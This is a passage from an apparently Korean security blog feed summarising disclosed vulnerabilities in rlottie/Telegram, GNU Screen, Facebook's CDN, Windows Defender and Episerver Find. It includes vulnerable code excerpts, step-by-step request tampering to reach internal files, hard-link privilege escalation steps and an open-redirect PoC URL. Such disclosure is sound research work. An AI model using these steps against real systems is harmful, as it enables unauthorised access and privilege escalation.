&#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-built_in">bool</span> VGradientCache::generateGradientColorTable(<span class="hljs-keyword">const</span> VGradientStops &amp;stops,                                                <span class="hljs-built_in">float</span>                 opacity,                                                <span class="hljs-built_in">uint</span>32_t *colorTable, <span class="hljs-built_in">int</span> size){    <span class="hljs-built_in">int</span>                  dist, idist, pos = <span class="hljs-number">0</span>, i;    <span class="hljs-built_in">bool</span>                 alpha = <span class="hljs-literal">false</span>;    <span class="hljs-built_in">int</span>                  stopCount = stops.size();    <span class="hljs-keyword">const</span> VGradientStop *curr, *next, *start;    <span class="hljs-built_in">uint</span>32_t             curColor, nextColor;    <span class="hljs-built_in">float</span>                delta, t, incr, fpos;    <span class="hljs-keyword">if</span> (!vCompare(opacity, <span class="hljs-number">1.0f</span>)) alpha = <span class="hljs-literal">true</span>;    start = stops.data();    curr = start;    <span class="hljs-keyword">if</span> (!curr-&gt;second.isOpaque()) alpha = <span class="hljs-literal">true</span>;    curColor = curr-&gt;second.premulARGB(opacity);  <span class="hljs-comment">// out-of-bounds value, curr-&gt;second is controlled</span>    incr = <span class="hljs-number">1.0</span> / (<span class="hljs-built_in">float</span>)size;                     <span class="hljs-comment">// static</span>    fpos = <span class="hljs-number">1.5</span> * incr;                            <span class="hljs-comment">// static</span>    colorTable[pos++] = curColor;    <span class="hljs-keyword">while</span> (fpos &lt;= curr-&gt;first) {                 <span class="hljs-comment">// curr-&gt;first is controlled and pos is not checked to be &lt; size, leading to </span>        colorTable[pos] = colorTable[pos - <span class="hljs-number">1</span>];    <span class="hljs-comment">// out-of-bounds write</span>        pos++;        fpos += incr;    }    [...]</code></pre><p><code>size</code>, <code>fpos</code>, <code>incr</code>&#xB294; static value&#xC774;&#xACE0;, <code>curr-&gt;first</code>, <code>curr-&gt;second</code>&#xB294; &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xC2A4;&#xD2F0;&#xCEE4;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xC9C1;&#xC811; &#xBC1B;&#xC544;&#xC635;&#xB2C8;&#xB2E4;. &#xBC18;&#xBCF5;&#xBB38;&#xC5D0;&#xC11C; <code>colorTable</code>&#xC744; &#xD560;&#xB2F9;&#xD560; &#xB54C; <code>pos</code>&#xC640;<code>colorTable</code> &#xBC30;&#xC5F4; &#xD06C;&#xAE30;&#xC778;  <code>size</code> &#xAC04;&#xC758; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xC2A4;&#xD2F0;&#xCEE4;&#xC758; <code>curr-&gt;first</code> &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xD799; &#xBA54;&#xBAA8;&#xB9AC; arbitrary overwrite&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC2A4;&#xD2F0;&#xCEE4;&#xB97C; &#xD1B5;&#xD574; overwrite &#xB41C; &#xAC12;&#xC740; <code>premulARGB()</code>&#xC640; <code>getColorReplacement()</code>&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xCF54;&#xB529; &#xB418;&#xACE0;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD574;&#xCEE4;&#xAC00; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, ASLR &#xC6B0;&#xD68C; &#xAC00;&#xC82F;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA74; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBCF4;&#xB0B8; <code>sticker.id</code>&#xAC00; &#xD154;&#xB808;&#xADF8;&#xB7A8; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC758; public sticker set&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xB85C; &#xC870;&#xC791;&#xB41C; &#xC2A4;&#xD2F0;&#xCEE4; &#xD30C;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>heap</tag>
      
      <tag>idioth</tag>
      
      <tag>telegram</tag>
      
      <tag>out-of-bounds</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GNU Screen crashs while processing characters</title>
    <link href="/2021/02/17/fabu1ous/2021-02-17/"/>
    <url>/2021/02/17/fabu1ous/2021-02-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26937">CVE-2021-26937</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>GNU screen &lt;= 4.8.0</p><ul><li>Debian 9 ( GNU Screen 4.05.00 )</li><li>Raspbian 10 ( GNU Screen 4.06.02 )</li><li>Ubuntu 20.04.1 ( GNU Screen 4.08.00, Windows WSL )</li><li>Ubuntu 20.04 ( GNU Screen 4.08.00 )</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>GNU Screen&#xC740; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xD55C; &#xD654;&#xBA74;&#xC5D0;&#xC11C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB3C4;&#xC640;&#xC8FC;&#xB294; multiplexer&#xB85C;, Mac OSX&#xC640; &#xB300;&#xBD80;&#xBD84;&#xC758; Linux &#xBC30;&#xD3EC;&#xD310;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. GNU Screen 4.8.0 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC740; &#xD2B9;&#xC815; UTF-8 &#xBB38;&#xC790; &#xC870;&#xD569;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;(CVE-2021-26937)&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; invalid write access&#xC640; Dos&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!combchars[i]){combchars[i] = (strcut comchar *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct combchar));<span class="hljs-keyword">if</span> (!comchars[i])<span class="hljs-keyword">return</span>;combchars[i]-&gt;prev = i;combchars[i]-&gt;next = i;}</code></pre><p>encode.c&#xC758; &#xC77C;&#xBD80; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. <code>comchars[i]</code>&#xC758; out-of-range&#xB85C; &#xC778;&#xD574; &#xD2B9;&#xC815; UTF-8 &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB418;&#xBA74; GNU Screen&#xC774; &#xBE44;&#xC815;&#xC0C1; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h2><p><img src="/2021/02/17/fabu1ous/2021-02-17/1.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Access files uploaded by employees to internal CDNs</title>
    <link href="/2021/02/16/idioth/2021-02-16/"/>
    <url>/2021/02/16/idioth/2021-02-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ysamm.com/?p=606">Access files uploaded by employees to internal CDNs / Regenerate URL Signature of user uploaded content</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Facebook</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC77C;&#xBC18; &#xD398;&#xC774;&#xC2A4;&#xBD81; &#xC720;&#xC800;&#xAC00; &#xBE44;&#xACF5;&#xAC1C;&#xB85C; &#xB3CC;&#xB9AC;&#xAC70;&#xB098; &#xC0AD;&#xC81C;&#xD55C; &#xCF58;&#xD150;&#xCE20;&#xB098; &#xC9C1;&#xC6D0;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xC720;&#xD6A8;&#xD55C; &#xD30C;&#xC77C; URL&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC77C;&#xBC18; &#xC720;&#xC800;&#xAC00; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xB294; <code>interncache-cln.fbcdn.net</code>&#xACFC; &#xAC19;&#xC740; &#xB0B4;&#xBD80; CDN&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xD30C;&#xC77C;&#xC744; &#xBC1B;&#xC544;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xD30C;&#xC77C;&#xC740; &#xD30C;&#xC77C;(&#xD578;&#xB4E4;)&#xC758; id&#xB97C; &#xD45C;&#xD604;&#xD558;&#xB294; &#xC554;&#xD638;&#xD654;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD1B5;&#xD574; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804; URL&#xC774;&#xB098; &#xD30C;&#xC77C; &#xD578;&#xB4E4;&#xC744; &#xC54C;&#xBA74; &#xB0B4;&#xBD80; CDN&#xC5D0; &#xC9C1;&#xC6D0;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC138;&#xD305;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>https://www.facebook.com/collabsmanager/start/</code>&#xC5D0;&#xC11C; Creator &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC2B9;&#xC778;&#xB418;&#xBA74;, <code>https://www.facebook.com/collabsmanager/</code>&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xC5EC; &#xB85C;&#xADF8;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. <code>https://business.facebook.com/collabsmanager/creator/creator_portfolio/{ID}/</code>&#xC640; &#xC720;&#xC0AC;&#xD55C; URL&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xD2B8; &#xB418;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>Creator &#xB4F1;&#xB85D;&#xC774; &#xC644;&#xB8CC;&#xB418;&#xBA74;, &#xB2E4;&#xC74C; &#xC21C;&#xC11C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>request &#xBC18;&#xBCF5;&#xC744; &#xC704;&#xD574; BurpSuite &#xAC19;&#xC740; &#xD504;&#xB85D;&#xC2DC; &#xC2E4;&#xD589;</li><li>&#x201C;Introduction&#x201D;&#xC5D0;&#xC11C; &#x201C;Edit&#x201D; &#xD074;&#xB9AD;</li><li>&#x201C;Add Video&#x201D;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xBE44;&#xB514;&#xC624; &#xC5C5;&#xB85C;&#xB4DC;</li><li>&#xC5C5;&#xB85C;&#xB4DC;&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xBA74; &#x201C;Delete&#x201D; &#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB7EC; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xBE44;&#xB514;&#xC624; &#xC0AD;&#xC81C;</li><li>BurpSuite history&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; 3&#xAC1C;&#xC758; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xD68D;&#xB4DD;<ol><li><code>https://vupload-edge.facebook.com/ajax/video/upload/requests/start/</code></li><li><code>https://vupload-edge.facebook.com/ajax/video/upload/requests/receive/</code></li><li><code>https://business.facebook.com/branded_content/creator_profile/pitch_deck_video/async/save/</code></li></ol></li><li><code>file_extension</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC744; <code>jpg</code>&#xB85C; &#xC218;&#xC815; &#xD6C4; <code>https://vupload-edge.facebook.com/ajax/video/upload/requests/start/</code>&#xC5D0; request&#xB97C; &#xBCF4;&#xB0B4;&#xBA74; response&#xC758; <code>video_id</code> XXXXXXXX&#xB97C; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>video_id</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC744; XXXXXXXX&#xB85C; &#xC218;&#xC815; &#xD6C4; <code>https://vupload-edge.facebook.com/ajax/video/upload/requests/receive/</code>&#xC5D0; request&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</li><li><code>fpuploader_video_file_chunk</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC744; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.<ul><li><code>1:dW5kZWZpbmVk:application/octet-stream:GBapFAFK2bAstIUBAAAAAACthEIbbj07AACa:e:1568148336:ARa5BNCPUwoIKBVqyao</code></li></ul></li></ol><p><code>GBapFAFK2bAstIUBAAAAAACthEIbbj07AACa</code>&#xB294; &#xD30C;&#xC77C;&#xC758; HANDLE&#xC774;&#xBA70;, CDN&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774; &#xD578;&#xB4E4; &#xAC12;&#xC744; &#xC218;&#xC815;&#xD558;&#xC5EC; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(ex.<code>GFxcvkCRANjMRgABANB4MEoAAAAAbnsvAAAB</code>) &#xD578;&#xB4E4; &#xAC12;&#xC744; &#xC218;&#xC815;&#xD55C; &#xD6C4; <code>start_offset</code>&#xACFC; <code>end_offset</code> &#xAC12;&#xC744; &#xC5BB;&#xAE30; &#xC704;&#xD574; response&#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>video_id</code>&#xB97C; XXXXXXX&#xB85C; &#xBC14;&#xAFBC; &#xD6C4; <code>https://business.facebook.com/branded_content/creator_profile/pitch_dec_video/async/save/</code>&#xC5D0; request&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</li><li><code>https://business.facebook.com/collabsmanager/creator/creator_portfolio/{ID}/</code>&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xC5EC; &#xBE44;&#xB514;&#xC624; &#xD50C;&#xB808;&#xC774;&#xC5B4; source tag&#xC758; <code>src</code> &#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC218;&#xC815;&#xB41C; &#xD578;&#xB4E4; &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; <code>scontent.*.fbcdn.net</code> &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xAC00;&#xC9C4; &#xD30C;&#xC77C; URL&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C; URL&#xC740; &#xB0B4;&#xBD80; CDN&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xACF5;&#xC6A9; CDN&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB85C; &#xBCF5;&#xC0AC;&#xB41C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>facebook</tag>
      
      <tag>cdn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-24092: 12년동안 존재한 Windows Defender 권한상승 취약점</title>
    <link href="/2021/02/15/l0ch/2021-02-15/"/>
    <url>/2021/02/15/l0ch/2021-02-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.sentinelone.com/cve-2021-24092-12-years-in-hiding-a-privilege-escalation-vulnerability-in-windows-defender/?fbclid=IwAR3HRkRwINUj1LDAsZ55Mz8t6CKqOsCFaRgmy19M0i7HJ_txY3Qp3dzPOsM">CVE-2021-24092: 12 Years in Hiding &#x2013; A Privilege Escalation Vulnerability in Windows Defender</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Defender</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender&#xC5D0;&#xC11C; &#xC798;&#xBABB;&#xB41C; &#xD30C;&#xC77C; &#xAC80;&#xC99D;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; 2009&#xB144;&#xBD80;&#xD130; &#xC874;&#xC7AC;&#xD574; &#xC57D; 12&#xB144; &#xB3D9;&#xC548; &#xC218;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>BTR.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; Windows Defender&#xC758; &#xC218;&#xC815; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C;, &#xCEE4;&#xB110; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC545;&#xC131; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xC758;&#xD574; &#xC0DD;&#xC131;&#xB41C; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xBC0F; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xACE0; &#xD65C;&#xC131;&#xD654;&#xB420; &#xB54C; <code>NTCreateFile</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; <code>C:\Windows\Temp\BootClean.log</code> &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; <code>CreateDisposition</code> &#xD544;&#xB4DC;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC0C8; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile">FILE_SUPERSEDE</a> &#xC635;&#xC158;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xB9C1;&#xD06C;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD574;&#xCEE4;&#xAC00; <code>C:\Windows\Temp\BootClean.log</code> &#xB97C; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xD558;&#xB4DC; &#xB9C1;&#xD06C;&#xB85C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Windows Defender&#xC5D0;&#xC11C; BTR &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xCEE4;&#xB294; &#xD558;&#xB4DC; &#xB9C1;&#xD06C;&#xB85C; &#xC5F0;&#xACB0;&#xB41C; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xBA40;&#xC6E8;&#xC5B4; &#xB4F1;&#xC73C;&#xB85C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>Microsoft&#xB294; 2&#xC6D4; 9&#xC77C;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>windows defender</tag>
      
      <tag>privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-24550 : Open redirect in Episerver Find</title>
    <link href="/2021/02/13/fabu1ous/2021-02-13/"/>
    <url>/2021/02/13/fabu1ous/2021-02-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://labs.nettitude.com/blog/cve-2020-24550-open-redirect-in-episerver-find/">cve-2020-24550</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Episerver Find &lt; 13.2.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Episerver Find&#xB294; &#xCEE8;&#xD150;&#xCE20; &#xAD00;&#xB9AC;, e-commerce, &#xC790;&#xB3D9; &#xB9C8;&#xCF00;&#xD305; &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xAC80;&#xC0C9;&#xC5D4;&#xC9C4; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;. Episerver Find 13.2.6 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Open redirect &#xCDE8;&#xC57D;&#xC810;(CVE-2020-24550)&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Episerver Find&#xB294; <code>_t_redirect</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; untrusted input&#xC744; redirect &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC784;&#xC758;&#xC758; URL&#xB85C; redirect &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs csharp">[<span class="hljs-meta">HttpGet</span>]<span class="hljs-function"><span class="hljs-keyword">public</span> HttpResponseMessage <span class="hljs-title">Index</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">[FromUri(Name = <span class="hljs-string">&quot;_t_id&quot;</span></span>)] <span class="hljs-keyword">string</span> id,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_q&quot;</span></span>)] <span class="hljs-keyword">string</span> query,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_hit.id&quot;</span></span>)] <span class="hljs-keyword">string</span> hitId,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_redirect&quot;</span></span>)] <span class="hljs-keyword">string</span> redirect</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_hit.pos&quot;</span></span>)] <span class="hljs-keyword">int</span>? hitPos</span> = <span class="hljs-literal">null</span>,[<span class="hljs-meta">FromUri(Name = <span class="hljs-meta-string">&quot;_t_tags&quot;</span>)</span>] <span class="hljs-keyword">string</span> tags = <span class="hljs-string">&quot;&quot;</span>){  <span class="hljs-keyword">this</span>.PostTrackData(id, query, hitId, hitPos, tags);  HttpResponseMessage response = HttpRequestMessageExtentions.CreateResponse(<span class="hljs-keyword">this</span>.get_Request(), HttpStatusCode.MovedPermanently);  response.Headers.Location = <span class="hljs-keyword">new</span> Uri(redirect);  <span class="hljs-keyword">return</span> response;}</code></pre><p><code>EPiServer.Find.UI.Controllers.ClickController.Index()</code> &#xBA54;&#xC18C;&#xB4DC;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. <code>_t_redirect</code>&#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xAC12;&#xC774; Location header&#xC778; 301 redirect reponse&#xB97C; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h2><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>{vulnerable}<span class="hljs-regexp">/find_v2/</span>_click?_t_id=&amp;_t_q=&amp;_t_hit.id=&amp;_t_redirect=https:/hackyboiz.github.io</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
